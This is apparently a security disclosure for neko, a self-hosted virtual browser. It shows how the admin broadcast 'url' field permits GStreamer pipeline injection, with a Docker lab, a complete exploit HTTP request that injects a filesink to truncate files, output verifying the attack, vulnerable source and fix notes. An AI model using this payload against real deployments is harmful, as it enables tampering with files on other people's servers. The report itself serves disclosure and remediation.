### Vulnerability details

**Official website / Product:** https://neko.m1k1o.net / https://github.com/m1k1o/neko

**Repository:** m1k1o/neko (stars at selection: 22592)

**Vulnerability type:** RCE (broadcast URL → GStreamer `gst_parse_launch` pipeline injection → `filesink` arbitrary file create/truncate)

**Vulnerability versions:** <= 3.2.0 (verified on `ghcr.io/m1k1o/neko/firefox:3.2.0` / revision `92420ca8e4709c1ac49961c4bf5d3cc786d44f0d`; sink present on master `22e35dd52560acc4c17522b029c215c5cc6e14de` and tag `v3.2.0`)

**Vulnerability URL / Parameter:** `POST /api/room/broadcast/start` JSON field `url`

**Complex:** yes

### Verification procedure

1. **Start the lab.** Original compose path `labs/neko-r60-a2/docker-compose.yml` may be torn down; use the equivalent compose below. Image `ghcr.io/m1k1o/neko/firefox:latest` (label version **3.2.0**, rev `92420ca8e4709c1ac49961c4bf5d3cc786d44f0d`), container `neko-r60-a2`, host **24002→8080**, WebRTC UDP 24020–24030. Env: `NEKO_MEMBER_MULTIUSER_ADMIN_PASSWORD=admin`, `NEKO_MEMBER_MULTIUSER_USER_PASSWORD=neko`, `NEKO_SESSION_IMPLICIT_HOSTING=true`, `NEKO_DESKTOP_UPLOAD_DROP=true`. After `docker compose up -d`, expect: network `neko-r60-a2_default` Created → container `neko-r60-a2` Created → Started.

```yaml
# Save as docker-compose.yml then: docker compose up -d
name: neko-r60-a2
services:
  neko:
    container_name: neko-r60-a2
    image: ghcr.io/m1k1o/neko/firefox:latest
    shm_size: "2gb"
    restart: "no"
    environment:
      NEKO_DESKTOP_SCREEN: 1280x720@30
      NEKO_DESKTOP_UPLOAD_DROP: "true"
      NEKO_MEMBER_MULTIUSER_ADMIN_PASSWORD: admin
      NEKO_MEMBER_MULTIUSER_USER_PASSWORD: neko
      NEKO_SESSION_IMPLICIT_HOSTING: "true"
      NEKO_WEBRTC_EPR: 24020-24030
      NEKO_WEBRTC_NAT1TO1: 127.0.0.1
    ports:
      - "24002:8080"
      - "24020-24030:24020-24030/udp"
```

2. **Admin login** (multiuser: any username + password `admin` yields admin). Take Bearer from response JSON `token`. The Bearer in the PoC below is the lab-captured value; replace it with a freshly logged-in token when reproducing.

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:24002
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin"}
```

3. **Create a marker file inside the container** (to prove `filesink` truncate):

```bash
docker exec neko-r60-a2 bash -lc 'printf "R60A2-BEFORE-TRUNCATE-MARKER\nkeep-me\n" > /home/neko/r60a2-poc-secret.txt; ls -l /home/neko/r60a2-poc-secret.txt; wc -c /home/neko/r60a2-poc-secret.txt'
```

Expected output example:

```text
-rw-r--r-- 1 neko neko 37 ... /home/neko/r60a2-poc-secret.txt
37 /home/neko/r60a2-poc-secret.txt
```

4. Send the PoC request below (break out of the single-quoted `rtmpsink location='...'` and inject a `filesink` targeting the marker path; trailing ` live=1'` is absorbed into `ximagesrc display-name='`).
5. Observe HTTP **204** and that the marker file is truncated to **0** bytes (arbitrary file create/truncate as user `neko`). Re-check:

```bash
docker exec neko-r60-a2 bash -lc 'ls -l /home/neko/r60a2-poc-secret.txt; wc -c /home/neko/r60a2-poc-secret.txt'
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified; replace Bearer with a fresh token from step 2):

```http
POST /api/room/broadcast/start HTTP/1.1
Host: 127.0.0.1:24002
Authorization: Bearer KQZWJpuKcxXFytmYy8GeR1H0vXEv-QE98wd29ELFZmYTsiJOKAY9CT2mrVUSryRf
Content-Type: application/json
Content-Length: 148
Connection: close

{"url": "x' name=rs  videotestsrc num-buffers=1 ! filesink location=/home/neko/r60a2-poc-secret.txt name=out  ximagesrc name=absorb display-name='"}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 204
Date: Mon, 02 Nov 2026 15:10:57 GMT
Connection: close

```

Verification result notes:

```text
BEFORE:
-rw-r--r-- 1 neko neko 37 Nov  2 15:10 /home/neko/r60a2-poc-secret.txt
R60A2-BEFORE-TRUNCATE-MARKER
keep-me
37 /home/neko/r60a2-poc-secret.txt

HTTP 204
AFTER:
-rw-r--r-- 1 neko neko 0 Nov  2 15:10 /home/neko/r60a2-poc-secret.txt
0 /home/neko/r60a2-poc-secret.txt
```

- Before: `/home/neko/r60a2-poc-secret.txt` size 37 bytes containing `R60A2-BEFORE-TRUNCATE-MARKER`.
- After HTTP 204: same path size 0 bytes (truncated by injected `filesink`).
- Same class of payload can create empty files at other paths writable by `neko` (e.g. under `/tmp`, `/home/neko`).

### Vulnerability analysis

Admin-only endpoint `POST /api/room/broadcast/start` accepts a broadcast `url` intended to be an RTMP destination. The default broadcast pipeline builds a GStreamer launch string with the URL interpolated into a single-quoted `rtmpsink location='%s live=1'` via `fmt.Sprintf` without escaping quotes or otherwise validating the value as a URL.

An attacker who is authenticated as admin can close the quote early and inject additional GStreamer elements into the `gst_parse_launch` graph. Injecting `filesink location=<path>` causes the `neko` process to create/truncate arbitrary filesystem paths (verified). Trailing ` live=1'` from the template can be absorbed into another element's string property (e.g. `ximagesrc display-name='`) so the pipeline still parses and starts (HTTP 204).

This is not the designed remote-control/desktop input path; it is unexpected pipeline injection on a URL field.

### Trigger / sink source (full path and line numbers)

```go
# File: server/internal/api/room/broadcast.go
# Lines: 25-51
func (h *RoomHandler) broadcastStart(w http.ResponseWriter, r *http.Request) error {
	data := &BroadcastStatusPayload{}
	if err := utils.HttpJsonRequest(w, r, data); err != nil {
		return err
	}
	if data.URL == "" {
		return utils.HttpBadRequest("missing broadcast URL")
	}
	broadcast := h.capture.Broadcast()
	if broadcast.Started() {
		return utils.HttpUnprocessableEntity("server is already broadcasting")
	}
	if err := broadcast.Start(data.URL); err != nil {
		return utils.HttpInternalServerError().WithInternalErr(err)
	}
	// ...
	return utils.HttpSuccess(w)
}
```

```go
# File: server/internal/capture/manager.go
# Lines: 96-110
return fmt.Sprintf(
	"flvmux name=mux ! rtmpsink location='%s live=1' "+
		"pulsesrc device=%s "+
		"! audio/x-raw,channels=2 "+
		"! audioconvert "+
		"! queue "+
		"! voaacenc bitrate=%d "+
		"! mux. "+
		"ximagesrc display-name=%s show-pointer=%v use-damage=false "+
		"! video/x-raw "+
		"! videoconvert "+
		"! queue "+
		"! x264enc threads=4 bitrate=%d key-int-max=15 byte-stream=true tune=zerolatency speed-preset=%s "+
		"! mux.", url, config.AudioDevice, config.BroadcastAudioBitrate*1000, config.Display, config.VideoShowPointer, config.BroadcastVideoBitrate, config.BroadcastPreset,
), nil
```

### Fix notes

- Do not interpolate attacker-controlled strings into GStreamer launch syntax.
- Treat `url` as data only: parse/validate as `rtmp(s)://` URL and pass via element properties API rather than `gst_parse_launch` string formatting.
- Escape or reject `'`, `!`, spaces, and other pipeline metacharacters if string building cannot be avoided.
- Prefer a fixed pipeline template with `location` set programmatically on the `rtmpsink` element.
